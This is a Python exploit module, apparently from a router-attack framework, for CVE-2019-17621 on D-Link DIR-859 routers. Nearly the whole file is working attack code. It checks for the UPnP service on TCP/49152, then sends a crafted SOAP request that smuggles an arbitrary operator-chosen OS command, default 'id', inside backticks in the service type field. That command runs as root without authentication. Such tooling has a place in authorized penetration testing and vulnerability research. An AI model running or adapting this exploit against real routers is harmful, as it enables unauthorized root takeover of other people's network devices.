# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """D-Link DIR-859 UPnP Command Injection RCE (CVE-2019-17621).

    The D-Link DIR-859 router (hardware revision A3) exposes a UPnP SOAP
    service on TCP/49152.  The GetDeviceSettings action handler does not
    sanitize input in the service type parameter, allowing command
    injection via a crafted SOAP request.

    An unauthenticated attacker on the LAN can inject arbitrary OS
    commands that execute as root on the router.

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "D-Link DIR-859 UPnP GetDeviceSettings Command Injection (CVE-2019-17621)",
        "description": (
            "Exploits CVE-2019-17621 via command injection in the UPnP SOAP "
            "GetDeviceSettings action on the D-Link DIR-859 router. "
            "The service type parameter is passed unsanitized to a shell "
            "command, enabling unauthenticated RCE as root from the LAN."
        ),
        "authors": (
            "s1kr10s (discovery and PoC)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2019-17621",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17621",
            "https://github.com/s1kr10s/D-Link-DIR-859-RCE",
            "https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10146",
        ),
        "devices": (
            "D-Link DIR-859 A3 1.06",
            "D-Link DIR-859 A3 1.05",
        ),
    }

    target = OptIP("", "Target IPv4 address of the D-Link DIR-859")
    port = OptPort(49152, "UPnP service port (default 49152)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    command = OptString("id", "Command to inject (default: id)")

    _SOAP_ENVELOPE = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        "<s:Body>"
        "<u:GetDeviceSettings "
        'xmlns:u="urn:schemas-upnp-org:service:{service_type}:1">'
        "</u:GetDeviceSettings>"
        "</s:Body>"
        "</s:Envelope>"
    )

    def _build_injection_request(self) -> bytes:
        """Build the HTTP POST with injected command in service type."""
        injected_type = f"WANIPConnection`{self.command}`"
        body = self._SOAP_ENVELOPE.format(service_type=injected_type)
        request = (
            f"POST /gena.cgi?service={injected_type} HTTP/1.1\r\n"
            f"Host: {self.target}:{self.port}\r\n"
            f"Content-Type: text/xml; charset=utf-8\r\n"
            f"Content-Length: {len(body)}\r\n"
            f'SOAPAction: "urn:schemas-upnp-org:service:{injected_type}:1'
            f'#GetDeviceSettings"\r\n'
            f"Connection: close\r\n"
            f"\r\n"
            f"{body}"
        )
        return request.encode()

    def _build_probe_request(self) -> bytes:
        """Build a benign UPnP description request."""
        request = (
            f"GET /upnpdevicedesc.xml HTTP/1.1\r\n"
            f"Host: {self.target}:{self.port}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        return request.encode()

    def _send_tcp(self, data: bytes) -> bytes:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        try:
            sock.connect((self.target, self.port))
            sock.sendall(data)
            time.sleep(0.5)
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except (TimeoutError, OSError):
                pass
            return response
        except Exception:
            return b""
        finally:
            sock.close()

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target does not appear to have UPnP on TCP/{self.port}"
            )
            return

        print_success("UPnP service confirmed; injecting command via SOAP")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Probe the UPnP service for DIR-859 device description."""
        try:
            response = self._send_tcp(self._build_probe_request())
            if not response:
                return False
            resp_str = response.decode("utf-8", errors="replace").lower()
            return any(
                marker in resp_str
                for marker in ["d-link", "dir-859", "upnp", "rootdevice"]
            )
        except Exception:
            return False

    def _exploit(self) -> None:
        print_status(
            f"Injecting command '{self.command}' via UPnP SOAP to "
            f"{self.target}:{self.port}"
        )

        request = self._build_injection_request()
        response = self._send_tcp(request)

        if response:
            resp_str = response.decode("utf-8", errors="replace")
            print_info(f"Response ({len(response)} bytes):")
            for line in resp_str.split("\n")[:10]:
                stripped = line.strip()
                if stripped:
                    print_info(f"  {stripped}")

            if "200" in resp_str[:30] or "GetDeviceSettings" in resp_str:
                print_success(
                    "SOAP action processed. Command injected via service "
                    "type parameter in GetDeviceSettings."
                )
            else:
                print_info(
                    "Response received but status unclear. "
                    "Target may be patched."
                )
        else:
            print_info(
                "No response received. Command may have executed without "
                "output, or the UPnP service rejected the request."
            )
